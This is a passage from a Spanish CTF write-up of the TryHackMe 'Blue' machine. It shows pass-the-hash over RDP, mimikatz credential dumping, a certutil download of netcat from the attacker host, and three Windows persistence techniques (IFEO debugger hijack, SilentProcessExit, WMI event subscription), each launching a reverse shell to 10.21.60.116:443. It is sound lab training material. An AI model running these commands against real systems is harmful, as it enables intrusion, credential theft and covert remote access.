+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/active_rdp_with_netexec.png"
+                      alt="Activando rdp con netexec."
+                ><figcaption>Activando rdp con netexec.</figcaption></figure></p>
+<p>Otro tip es que ya que tenemos acceso al equipo víctima, podemos comprobar si dicho puerto se ha abierto con el comando:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -na</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-n</strong>: Muestra las direcciones ip y los números de puerto en formato numérico. Sin está opción también intentaría resolver el nombre de los host y tardaría más tiempo.</li>
+<li><strong>-a</strong>: Muestra todas las conexiones y puertos activos.</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/netstat_open_port.png"
+                      alt="Comprobación del estado del puerto rdp en la máquina víctima."
+                ><figcaption>Comprobación del estado del puerto rdp en la máquina víctima.</figcaption></figure></p>
+<p>Ejecucción de la conexión para obtener el escritorio:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop 10.10.145.252 -u <span class="string">&#x27;Administrator&#x27;</span> -p <span class="string">&#x27;no_la_tengo&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Si no tienes la contraseña puedes usar <strong>xfreerdp</strong> para usar pass the hash, en arch tienes que instalar el paquete AUR:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S freerdp2</span><br></pre></td></tr></table></figure></div>
+
+<p>Después ya lo puedes ejecutar con <strong>xfreerdp</strong>:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.10.202.55 /u:Administrator /pth:d144986c6122b1b1654ba39932465528 /sec:rdp</span><br></pre></td></tr></table></figure></div>
+
+<p>En W7 no podemos aplicar pass the hash porque necesitamos tener el modo restricted Admin Mode activado, esto solo es posible a partir del Windows 8.1, lo podemos ver en la ayuda del comando xfreerdp si aún así quieres intentarlo verás que no se conecta al usuario Administrator, si no que tienes que introducir la contraseña:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/hash_the_pass_rdp_w7_not_allowed.png"
+                      alt="Hash the pass en Windows 7 no permitido."
+                ><figcaption>Hash the pass en Windows 7 no permitido.</figcaption></figure></p>
+<p>Así que tenemos que seguir buscando una manera para buscar la contraseña sin llegar a descifrar el hash.</p>
+<p>Lo que podemos hacer es entrar mediante RDP(ya que la contraseña se la hemos establecido nosotros) con las credenciales Administrator&#x2F;Administrator, <strong>simulando la conexión de un tercero</strong>. Una vez realizado esto realizamos las mismas operaciones con mimikatz y vemos si aparece algo más de información.</p>
+<p>La idea es ejecutar los comandos del mimikatz una vez conectado por RDP(en mi caso lo he realizado mientras está la conexión activa)</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/conexion_mediante_rdp_sabiendo_la_contrase%C3%B1a.png"
+                      alt="Conexión simulando un tercero."
+                ><figcaption>Conexión simulando un tercero.</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/mimikatz_con_credenciales_administrator.png"
+                      alt="Mimikatz con las credenciales del administrador en texto claro."
+                ><figcaption>Mimikatz con las credenciales del administrador en texto claro.</figcaption></figure></p>
+<p>Genial, ahora si podemos ver la contraseña en texto claro, hashes…En caso de ser una contraseña compleja os la podríais encontrar mediante mimikatz y ser de gran ayuda.</p>
+<h1 id="Persistencia"><a href="#Persistencia" class="headerlink" title="Persistencia"></a>Persistencia</h1><h2 id="1-Cuando-se-abre-una-aplicacion-que-nos-de-una-shell"><a href="#1-Cuando-se-abre-una-aplicacion-que-nos-de-una-shell" class="headerlink" title="1. Cuando se abre una aplicación que nos de una shell."></a>1. Cuando se abre una aplicación que nos de una shell.</h2><p>Cada vez que se abra el explorador de archivos vamos a obtener una shell, lo primero es buscar el binario o nombre de este:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Windows\system32</span><br><span class="line"><span class="built_in">dir</span> | <span class="built_in">find</span> &quot;explore&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/encontrado_el_binario_del_explorador_de_archivos.png"
+                      alt="Binario del explorador de archivos."
+                ><figcaption>Binario del explorador de archivos.</figcaption></figure></p>
+<p>Una vez localizado(explorer.exe) debemos realizar una copia:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> explorer.exe _explorer.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Debemos de subir un binario netcat, para que pueda enviarnos la shell:</p>
+<p>Nos lo descargamos en nuestro máquina atacante, en mi caso utilice este <a class="link"   href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe" >repositorio<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> y una vez traido a mi máquina lo renombre como nc.exe.</p>
+<p>Nos movemos a la carpeta creada en temp aunque no haría falta porque somos Administradores, pero al estar ya creada.</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Windows\Temp\postExplotacion</span><br></pre></td></tr></table></figure></div>
+
+<p>Y de la misma forma que nos descargamos mimikatz lo hacemos con nc, en este caso no vamos a utilizar ebowla porque el firewall no lo detecta y no hace falta.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m http.server 80</span><br><span class="line">certutil -f -urlcache -<span class="built_in">split</span> http://10.21.60.116/nc.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Una vez descargado vamos a añadir el siguiente registro:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe&quot; /v Debugger /t reg_sz /d &quot;<span class="built_in">cmd</span> /C _explorer.exe &amp; C:\Windows\Temp\postExplotacion\nc.exe -e <span class="built_in">cmd</span> <span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span> <span class="number">443</span>&quot; /f </span><br></pre></td></tr></table></figure></div>
+
+<p>En caso de equivocarte con algo para eliminarlo sería así:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe&quot; /v Debugger /f</span><br></pre></td></tr></table></figure></div>
+
+<p>Si nos ponemos en escucha por el puerto 443 y abrimos el explorador de archivos veremos lo siguiente:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/obtain_reverse_shell_open_explorer.png"
+                      alt="Obteniendo una reverse shell al abrir el explorador de archivos."
+                ><figcaption>Obteniendo una reverse shell al abrir el explorador de archivos.</figcaption></figure></p>
+<p>Cómo podeis ver es un poco bastante cantoso, porque se ve la terminal y indica que el comando _explorer no se ha reconocido, según la aplicación que utiliceis se mostrará de una manera u otra. No es recomendable para casos de auditorías reales donde se busque la descripción. Normalmente es útil identificar que aplicaciones son las que abre el usuario constantemente(por ejemplo el office) y realizar algo así, pero más camuflado.</p>
+<p>Cuando se cierra la aplicación se cierra el proceso de la cmd, tienes que buscar la manera rápida de poner el proceso en segundo plano o directamente hacerlo al enviar el comando de netcat.</p>
+<h2 id="2-Cuando-se-cierra-un-programa-que-nos-de-una-shell"><a href="#2-Cuando-se-cierra-un-programa-que-nos-de-una-shell" class="headerlink" title="2. Cuando se cierra un programa que nos de una shell."></a>2. Cuando se cierra un programa que nos de una shell.</h2><p>Esta última opción, desconozco el motivo, pero <strong>no consigue darme una shell</strong>, dejo por aquí cómo sería el código.</p>
+<p>Vamos a indicar que cuando se cierre el bloc de notas(notepad) nos de una shell:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d <span class="number">512</span> </span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d <span class="number">1</span></span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Windows\Temp\postExplotacion\nc.exe -e C:\Windows\System32\<span class="built_in">cmd</span>.exe <span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span> <span class="number">443</span>&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3-Utilizando-los-eventos-WMI-para-ejecutar-una-tarea-en-intervalos-regulares-de-tiempo"><a href="#3-Utilizando-los-eventos-WMI-para-ejecutar-una-tarea-en-intervalos-regulares-de-tiempo" class="headerlink" title="3. Utilizando los eventos WMI para ejecutar una tarea en intervalos regulares de tiempo."></a>3. Utilizando los eventos WMI para ejecutar una tarea en intervalos regulares de tiempo.</h2><p>Está es la mejor de las tres porque es la manera más “sigilosa”, vamos a hacer que <strong>cada minuto</strong> mande una shell a nuestro equipo, pero antes de eso</p>
+<p>Creación de binario para reverse shell con msfvenom:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span> LPORT=<span class="number">443</span> -f exe -o persistencia.exe</span><br></pre></td></tr></table></figure></div>
+
+<p>Una vez transferido con certutil(no hace falta ofuscarlo) vamos a ejecutar el binario y nos ponemos en escucha en nuestro equipo para comprobar que esta correcto y llega la shell.</p>
+<p>Una vez comprobado que llega la shell, vamos a introducir los siguientes registros:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">wmic /NAMESPACE: &quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter CREATE Name=&quot;persistence&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN <span class="number">60</span> WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> CommandLineEventConsumer CREATE Name=&quot;persistence&quot;, ExecutablePath=&quot;C:\Windows\Temp\postExplotacion\persistencia.exe&quot;,CommandLineTemplate=&quot;C:\Windows\Temp\postExplotacion\persistencia.exe&quot; </span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __FilterToConsumerBinding CREATE Filter=&quot;___EventFilter.Name=&quot;persistence&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=&quot;persistence&quot;&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>Nos ponemos en escucha con netcat como siempre y si esperamos un minuto nos da una consola del usuario Administrator. </p>
+<h1 id="Conclusiones-finales"><a href="#Conclusiones-finales" class="headerlink" title="Conclusiones finales"></a>Conclusiones finales</h1><p>Podéis apreciar como se ha podido complicar una simple máquina “Easy”(fácil) cuando te despegas de Metasploit y te metes más en el barro para saber que está pasando, está metodología se utiliza para un mayor control de las situaciones y donde el metasploit no llega, la explotación manual es completamente válida para una certificación como OSCP. Espero que os haya gustado esta máquina y hayáis aprendido tanto como yo en el camino o más:).</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>tryhackme</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>eJPT</tag>
+        <tag>tryhackme</tag>
+        <tag>easy</tag>
+        <tag>windows</tag>
+        <tag>eternalblue</tag>
+        <tag>ms17-010</tag>
+        <tag>metasploit</tag>
+        <tag>manual exploitation</tag>
+        <tag>triple z script&quot;</tag>
+        <tag>AutoBlue</tag>
+        <tag>mimikatz</tag>
+        <tag>Windows Defender Evasion</tag>
+        <tag>Ebowla</tag>
+        <tag>enable RDP with netexec</tag>
+        <tag>windows persistence</tag>
+        <tag>persistence with debugging</tag>
+        <tag>persistence with gflags</tag>
+        <tag>persistence with WMI Events</tag>
       </tags>
   </entry>
 </search>
